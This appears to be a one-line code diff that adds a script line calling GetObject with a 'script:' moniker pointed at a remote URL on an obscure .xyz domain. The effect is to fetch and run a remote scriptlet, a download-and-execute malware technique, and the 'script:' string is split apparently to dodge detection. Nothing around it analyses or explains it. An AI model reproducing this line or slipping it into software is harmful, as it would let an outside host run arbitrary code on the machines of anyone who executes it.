@@ -1,0 +1,1 @@
+var a = 'script:';GetObject(a+'HTtp://a965dhkuami.semanaforte.xyz/?1/')
